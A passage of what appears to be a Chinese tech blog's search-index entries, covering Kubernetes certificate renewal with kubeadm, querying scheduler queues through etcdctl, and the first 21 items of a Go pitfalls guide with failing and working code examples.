年，因此需要定时更新证书，否则证书到期会导致整个集群不可用。 自动更新证书，Kubenetes 在升级控制面板相关组件时会主动更新证书，因此如果保证 Kubernetes 能够定期（一年以内）升级的话，证书会自动更新。 环境说明：k8s 1.18.10 以下步骤，在所有 master 节点执行 具体操作步骤 ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:0","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"1）检查证书是否过期，以下两个命令均可 kubeadm alpha certs check-expiration openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -text |grep ' Not ' ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:1","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"2）证书、配置文件等备份 cp -rp /etc/kubernetes /etc/kubernetes.bak ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:2","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"3）重新生成证书 kubeadm alpha certs renew all ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:3","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"4）重新生成配置文件 rm -f /etc/kubernetes/*.conf kubeadm init phase kubeconfig all ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:4","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"5）重启 kubelet、apiserver、scheduler、controller-manager、etcd systemctl restart kubelet docker ps | egrep \"k8s_kube-apiserver|k8s_kube-scheduler|k8s_kube-controller-manager|k8s_etcd\" | awk '{print $1}' | xargs docker restart ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:5","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"6）更新 admin 配置 cp /etc/kubernetes/admin.conf ~/.kube/config ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:6","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"7）检查证书过期时间 kubeadm alpha certs check-expiration 如果重新生成过程中有错误，就把旧文件删除 ","date":"2023-07-22","objectID":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/:4:7","tags":["K8S"],"title":"k8s证书更新","uri":"/posts/2023/07/k8s%E8%AF%81%E4%B9%A6%E6%9B%B4%E6%96%B0/"},{"categories":["K8S"],"content":"k8s查询队列方法 k8s1.20环境中的调度器队列信息无法通过下面命令查到 kubectl get queue 可以通过查询etcd方式获取，命令如下，ENDPOINTS改为实际的etcd地址 ENDPOINTS=https://172.31.4.33:2379 ETCDCTL_API=3 etcdctl --endpoints=${ENDPOINTS} --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/member-node1.pem --key=/etc/ssl/etcd/ssl/member-node1-key.pem get / --prefix --keys-only|grep queue 输出打印如下： /registry/apiextensions.k8s.io/customresourcedefinitions/queues.scheduling.incubator.k8s.io /registry/apiextensions.k8s.io/customresourcedefinitions/queues.scheduling.sigs.dev /registry/scheduling.incubator.k8s.io/queues/00000000000000000000000000000000 /registry/scheduling.incubator.k8s.io/queues/default /registry/scheduling.incubator.k8s.io/queues/emergency-queue /registry/scheduling.sigs.dev/queues/1b662d2a0cdc4d58a577be82fde44906 /registry/scheduling.sigs.dev/queues/84a5d7b9407c47f9b37d2d8c081b0d41 /registry/scheduling.sigs.dev/queues/a85129c8027e4c97a3395437bf338aa2 ","date":"2023-06-30","objectID":"/posts/2023/06/k8s%E6%9F%A5%E8%AF%A2%E9%98%9F%E5%88%97%E6%96%B9%E6%B3%95/:0:0","tags":["K8S"],"title":"k8s查询队列方法","uri":"/posts/2023/06/k8s%E6%9F%A5%E8%AF%A2%E9%98%9F%E5%88%97%E6%96%B9%E6%B3%95/"},{"categories":["Go"],"content":"Go 是一种简单而有趣的语言，但是，与任何其他语言一样，它也有一些陷阱……其中许多陷阱并不完全是 Go 的错。其中一些错误是自然陷阱。其他是由于错误的假设和缺少细节。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:0:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"概述 初学者: 不能将左大括号放在单独的行上 未使用的变量 未使用的进口 短变量声明只能在函数内部使用 使用短变量声明重新声明变量 不能使用短变量声明来设置字段值 意外变量阴影 不能使用“nil”来初始化没有显式类型的变量 使用“nil”切片和映射 地图容量 字符串不能为“nil” 数组函数参数 切片和数组“范围”子句中的意外值 切片和数组是一维的 访问不存在的映射键 字符串是不可变的 字符串和字节片之间的转换 字符串和索引运算符 字符串并不总是 UTF8 文本 字符串长度 多行切片/数组/映射文字中缺少逗号 log.Fatal 和 log.Panic 不仅仅是日志 内置数据结构操作不同步 “范围”子句中字符串的迭代值 使用“for range”子句遍历地图 “switch”语句中的失败行为 增量和减量 按位非运算符 运算符优先级差异 未导出的结构字段未编码 带有活动 Goroutines 的应用程序退出 目标接收器准备好后立即返回到无缓冲通道 发送到关闭的频道会导致恐慌 使用“零”通道 带有值接收器的方法不能更改原始值 中级初学者： 关闭 HTTP 响应正文 关闭 HTTP 连接 JSON 编码器添加换行符 JSON 包转义键和字符串值中的特殊 HTML 字符 将 JSON 数字解组为接口值 十六进制或其他非 UTF8 转义序列无法使用 JSON 字符串值 比较结构、数组、切片和映射 从恐慌中恢复 更新和引用切片、数组和映射“for range”子句中的项值 切片中的“隐藏”数据 切片数据损坏 “陈旧”切片 类型声明和方法 打破“for switch”和“for select”代码块 “for”语句中的迭代变量和闭包 延迟函数调用参数评估 延迟函数调用执行 失败的类型断言 阻塞的 Goroutines 和资源泄漏 不同零大小变量的相同地址 iota 的首次使用并不总是从零开始 高级初学者： 在值实例上使用指针接收器方法 更新 map 值字段 “nil”接口和“nil”接口值 堆栈和堆变量 GOMAXPROCS、并发和并行 读写操作重新排序 抢先调度 Cgo（又名勇敢的初学者）： 导入 C 和多行导入块 Import C 和 Cgo 注释之间没有空行 不能使用可变参数调用 C 函数 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:1:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"1.不能将左大括号放在单独的行上 级别：初学者 在大多数使用大括号的其他语言中，您可以选择放置它们的位置。您可以感谢这种行为的自动分号注入（没有前瞻）。是的，Go 确实有分号 :-) Fails: package main import \"fmt\" func main() { //error, can't have the opening brace on a separate line fmt.Println(\"hello there!\") } Compile Error: /tmp/sandbox826898458/main.go:6: syntax error: unexpected semicolon or newline before { Works: package main import \"fmt\" func main() { fmt.Println(\"works!\") } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:2:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"2.未使用的变量 级别：初学者 如果您有一个未使用的变量，您的代码将无法编译。不过有一个例外。您必须使用在函数内部声明的变量，但如果您有未使用的全局变量，也可以。有未使用的函数参数也是可以的。 如果您为未使用的变量分配新值，您的代码仍将无法编译。您需要以某种方式使用变量值来使编译器满意。 Fails: package main var gvar int //not an error func main() { var one int //error, unused variable two := 2 //error, unused variable var three int //error, even though it's assigned 3 on the next line three = 3 func(unused string) { fmt.Println(\"Unused arg. No compile error\") }(\"what?\") } Compile Errors: /tmp/sandbox473116179/main.go:6: one declared and not used /tmp/sandbox473116179/main.go:7: two declared and not used /tmp/sandbox473116179/main.go:8: three declared and not used Works: package main import \"fmt\" func main() { var one int _ = one two := 2 fmt.Println(two) var three int three = 3 one = three var four int four = four } Another option is to comment out or remove the unused variables :-) ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:3:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"3.未使用的 import 级别：初学者 如果您在不使用任何导出函数、接口、结构或变量的情况下导入包，您的代码将无法编译。 如果您确实需要导入的包，可以使用空白标识符_, 作为其包名，以避免编译失败。空白标识符用于导入包的副作用。 Fails: package main import ( \"fmt\" \"log\" \"time\" ) func main() { } Compile Errors: /tmp/sandbox627475386/main.go:4: imported and not used: “fmt” /tmp/sandbox627475386/main.go:5: imported and not used: “log” /tmp/sandbox627475386/main.go:6: imported and not used: “time” Works: package main import ( _ \"fmt\" \"log\" \"time\" ) var _ = log.Println func main() { _ = time.Now } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:4:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"4.短变量声明只能在函数内部使用 级别：初学者 Fails: package main myvar := 1 //error func main() { } Compile Error: /tmp/sandbox265716165/main.go:3: non-declaration statement outside function body Works: package main var myvar = 1 func main() { } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:5:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"5.使用短变量声明重新声明变量 级别：初学者 您不能在独立语句中重新声明变量，但在至少声明一个新变量的多变量声明中是允许的。 重新声明的变量必须在同一个块中，否则您最终会得到一个阴影变量。 Fails: package main func main() { one := 0 one := 1 //error } Compile Error: /tmp/sandbox706333626/main.go:5: no new variables on left side of := Works: package main func main() { one := 0 one, two := 1,2 one,two = two,one } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:6:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"6.不能使用短变量声明来设置字段值 级别：初学者 Fails: package main import ( \"fmt\" ) type info struct { result int } func work() (int,error) { return 13,nil } func main() { var data info data.result, err := work() //error fmt.Printf(\"info: %+v\\n\",data) } Compile Error: prog.go:18: non-name data.result on left side of := 使用临时变量或预先声明所有变量并使用标准赋值运算符。 Works: package main import ( \"fmt\" ) type info struct { result int } func work() (int,error) { return 13,nil } func main() { var data info var err error data.result, err = work() //ok if err != nil { fmt.Println(err) return } fmt.Printf(\"info: %+v\\n\",data) //prints: info: {result:13} } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:7:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"7.变量覆盖（Variable Shadowing） 级别：初学者 简短的变量声明语法非常方便（特别是对于那些来自动态语言的语言），很容易将其视为常规赋值操作。如果您在新代码块中犯了这个错误，则不会出现编译器错误，但您的应用程序不会按照您的预期执行。 package main import \"fmt\" func main() { x := 1 fmt.Println(x) //prints 1 { fmt.Println(x) //prints 1 x := 2 fmt.Println(x) //prints 2 } fmt.Println(x) //prints 1 (bad if you need 2) } 即使对于经验丰富的 Go 开发人员来说，这也是一个非常常见的陷阱。它很容易制作，而且很难被发现。 您可以使用该vet命令来查找其中的一些问题。默认情况下，vet不会执行任何阴影变量检查。确保使用-shadow标志：go tool vet -shadow your_file.go 请注意，该vet命令不会报告所有阴影变量。用于go-nyet更积极的阴影变量检测。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:8:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"8.不能使用“nil”来初始化没有显式类型的变量 级别：初学者 “nil”标识符可用作接口、函数、指针、映射、切片和通道的“零值”。如果您不指定变量类型，编译器将无法编译您的代码，因为它无法猜测类型。 Fails: package main func main() { var x = nil //error _ = x } Compile Error: /tmp/sandbox188239583/main.go:4: use of untyped nil Works: package main func main() { var x interface{} = nil _ = x } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:9:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"9.使用“nil”切片和映射 级别：初学者 可以将元素添加到“nil”切片，但对 map 执行相同操作会产生运行时panic 。 Works: gopackage main func main() { var s []int s = append(s,1) } Fails: package main func main() { var m map[string]int m[\"one\"] = 1 //error } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:10:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"10.map 容量 级别：初学者 您可以在创建 map 时指定容量，但不能使用cap(map)函数计算容量。这是跟slice的不同点。 Fails: package main func main() { m := make(map[string]int,99) cap(m) //error } Compile Error: /tmp/sandbox326543983/main.go:5: invalid argument m (type map[string]int) for cap ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:11:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"11.字符串不能为“nil” 级别：初学者 对于习惯于将“nil”标识符分配给字符串变量的开发人员来说，这是一个陷阱。 Fails: package main func main() { var x string = nil //error if x == nil { //error x = \"default\" } } Compile Errors: /tmp/sandbox630560459/main.go:4: cannot use nil as type string in assignment /tmp/sandbox630560459/main.go:6: invalid operation: x == nil (mismatched types string and nil) Works: package main func main() { var x string //defaults to \"\" (zero value) if x == \"\" { x = \"default\" } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:12:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"12.数组函数参数：数组指针类型 级别：初学者 如果您是 C 或 C++ 开发人员，那么您的数组就是指针。当您将数组传递给函数时，函数引用相同的内存位置，因此它们可以更新原始数据。Go 中的数组是值，因此当您将数组传递给函数时，函数会获取原始数组数据的副本。如果您尝试更新数组数据，这可能是个问题。 package main import \"fmt\" func main() { x := [3]int{1,2,3} func(arr [3]int) { arr[0] = 7 fmt.Println(arr) //prints [7 2 3] }(x) fmt.Println(x) //prints [1 2 3] (not ok if you need [7 2 3]) } 如果您需要更新原始数组数据，请使用数组指针类型。 package main import \"fmt\" func main() { x := [3]int{1,2,3} func(arr *[3]int) { (*arr)[0] = 7 fmt.Println(arr) //prints \u0026[7 2 3] }(\u0026x) fmt.Println(x) //prints [7 2 3] } 另一种选择是使用切片。即使您的函数获得了切片变量的副本，它仍然引用原始数据。 package main import \"fmt\" func main() { x := []int{1,2,3} func(arr []int) { arr[0] = 7 fmt.Println(arr) //prints [7 2 3] }(x) fmt.Println(x) //prints [7 2 3] } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:13:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"13.切片和数组“range”子句中的意外值 级别：初学者 如果您习惯了其他语言中的“for-in”或“foreach”语句，就会发生这种情况。Go 中的“范围”子句是不同的。它生成两个值：第一个值是项目索引，而第二个值是项目数据。 Bad: package main import \"fmt\" func main() { x := []string{\"a\",\"b\",\"c\"} for v := range x { fmt.Println(v) //prints 0, 1, 2 } } Good: package main import \"fmt\" func main() { x := []string{\"a\",\"b\",\"c\"} for _, v := range x { fmt.Println(v) //prints a, b, c } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:14:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"14.切片和数组是一维的 级别：初学者 看起来 Go 似乎支持多维数组和切片，但事实并非如此。但是，可以创建数组数组或切片切片。对于依赖动态多维数组的数值计算应用程序，它在性能和复杂性方面远非理想。 您可以使用原始一维数组、“独立”切片的切片和“共享数据”切片的切片来构建动态多维数组。 如果您使用原始一维数组，您需要在数组需要增长时负责索引、边界检查和内存重新分配。 使用“独立”切片的切片创建动态多维数组是一个两步过程。首先，您必须创建外部切片。然后，您必须分配每个内部切片。内部切片彼此独立。您可以在不影响其他内部切片的情况下扩展和收缩它们。 package main func main() { x := 2 y := 4 table := make([][]int,x) for i:= range table { table[i] = make([]int,y) } } 使用“共享数据”切片创建动态多维数组是一个三步过程。首先，您必须创建将保存原始数据的数据“容器”切片。然后，您创建外部切片。最后，通过重新切片原始数据切片来初始化每个内部切片。 package main import \"fmt\" func main() { h, w := 2, 4 raw := make([]int,h*w) for i := range raw { raw[i] = i } fmt.Println(raw,\u0026raw[4]) //prints: [0 1 2 3 4 5 6 7] \u003cptr_addr_x\u003e table := make([][]int,h) for i:= range table { table[i] = raw[i*w:i*w + w] } fmt.Println(table,\u0026table[1][0]) //prints: [[0 1 2 3] [4 5 6 7]] \u003cptr_addr_x\u003e } 有一个针对多维数组和切片的规范/建议，但目前看来它是一个低优先级的功能。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:15:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"15.访问不存在的map的key 级别：初学者 对于希望获得“nil”标识符的开发人员来说，这是一个陷阱（就像在其他语言中所做的那样）。如果相应数据类型的“零值”为“nil”，则返回值为“nil”，但对于其他数据类型则不同。检查适当的“零值”可用于确定映射记录是否存在，但它并不总是可靠的（例如，如果您有一个布尔映射，其中“零值”为假，您会怎么做）。了解给定map记录是否存在的最可靠方法是检查map访问操作返回的第二个值。 Bad: package main import \"fmt\" func main() { x := map[string]string{\"one\":\"a\",\"two\":\"\",\"three\":\"c\"} if v := x[\"two\"]; v == \"\" { //incorrect fmt.Println(\"no entry\") } } Good: package main import \"fmt\" func main() { x := map[string]string{\"one\":\"a\",\"two\":\"\",\"three\":\"c\"} if _,ok := x[\"two\"]; !ok { fmt.Println(\"no entry\") } } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:16:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"16.字符串是不可变的 级别：初学者 尝试使用索引运算符更新字符串变量中的单个字符将导致失败。字符串是只读字节切片（带有一些额外的属性）。如果确实需要更新字符串，则在必要时使用字节切片而不是将其转换为字符串类型。 Fails: package main import \"fmt\" func main() { x := \"text\" x[0] = 'T' fmt.Println(x) } Compile Error: /tmp/sandbox305565531/main.go:7: cannot assign to x[0] Works: package main import \"fmt\" func main() { x := \"text\" xbytes := []byte(x) xbytes[0] = 'T' fmt.Println(string(xbytes)) //prints Text } 请注意，这实际上并不是更新文本字符串中字符的正确方法，因为给定的字符可以存储在多个字节中。如果您确实需要对文本字符串进行更新，请先将其转换为符文切片。即使使用符文切片，单个字符也可能跨越多个符文，例如，如果您有带有重音的字符，就会发生这种情况。“字符”的这种复杂和模棱两可的性质是 Go 字符串被表示为字节序列的原因。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:17:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"17.字符串和字节片之间的转换 级别：初学者 当您将字符串转换为字节切片（反之亦然）时，您将获得原始数据的完整副本。它不像其他语言中的强制转换操作，也不像重新切片新切片变量指向原始字节切片使用的相同底层数组的位置。 Go 确实对 []byte to string 和 string to []byte转换进行了一些优化，以避免额外的分配（对 todo 列表进行了更多优化）。 当 []byte 键用于查找 map[string] 集合中的条目时，第一个优化避免了额外的分配：m[string(key)] 第二个优化避免了 for range字符串转换为[]byte:的子句中的额外分配for i,v := range []byte(str) {…} ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:18:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"18.字符串和索引运算符 级别：初学者 字符串上的索引运算符返回一个字节值，而不是一个字符（就像在其他语言中所做的那样）。 package main import \"fmt\" func main() { x := \"text\" fmt.Println(x[0]) //print 116 fmt.Printf(\"%T\",x[0]) //prints uint8 } 如果您需要访问特定的字符串“字符”（unicode 代码点/符文），请使用该for range子句。官方的“unicode/utf8”包和实验性的utf8string包（golang.org/x/exp/utf8string）也很有用。utf8string 包包含一个方便的At()方法。将字符串转换为一片符文也是一种选择。 ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:19:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"19.字符串并不总是 UTF8 文本 级别：初学者 字符串值不需要是 UTF8 文本。它们可以包含任意字节。字符串是 UTF8 的唯一时间是使用字符串文字时。即使这样，它们也可以使用转义序列包含其他数据。 要知道您是否有 UTF8 文本字符串，请使用ValidString()“unicode/utf8”包中的函数。 package main import ( \"fmt\" \"unicode/utf8\" ) func main() { data1 := \"ABC\" fmt.Println(utf8.ValidString(data1)) //prints: true data2 := \"A\\xfeC\" fmt.Println(utf8.ValidString(data2)) //prints: false } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:20:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"20.字符串长度 级别：初学者 假设您是一名 python 开发人员，并且您有以下代码： data = u'♥' print(len(data)) #prints: 1 当您将其转换为类似的 Go 代码片段时，您可能会感到惊讶。 package main import \"fmt\" func main() { data := \"♥\" fmt.Println(len(data)) //prints: 3 } 内置len()函数返回字节数，而不是像 Python 中的 unicode 字符串那样返回字符数。 要在 Go 中获得相同的结果，请使用 RuneCountInString() “unicode/utf8”包中的函数。 package main import ( \"fmt\" \"unicode/utf8\" ) func main() { data := \"♥\" fmt.Println(utf8.RuneCountInString(data)) //prints: 1 从技术上讲，该RuneCountInString()函数不返回字符数，因为单个字符可能跨越多个符文。 package main import ( \"fmt\" \"unicode/utf8\" ) func main() { data := \"é\" fmt.Println(len(data)) //prints: 3 fmt.Println(utf8.RuneCountInString(data)) //prints: 2 } ","date":"2023-05-29","objectID":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/:21:0","tags":["Go"],"title":"GO编程陷阱和常见错误","uri":"/posts/2023/05/go%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"},{"categories":["Go"],"content":"21.多行切片、数组和映射文字中缺少逗号 级别：初学者 Fails: package main func main() { x := []int{ 1, 2 //error } _ = x } Compile Errors: /tmp/sandbox367520156/main.go:6: syntax error: need trailing comma before newline in composite literal /tmp/sandbox367520156/main.go:8: non-declaration statement outside function body /tmp/sandbox367520156/main.go:9: syntax error: unexpected } Works: package main func main() { x := []int{ 1, 2, } x = x y := []int{3,4,} //no error y = y } 如果在将声明折叠为一行时留下尾随逗号，则不会出现编译器错误。 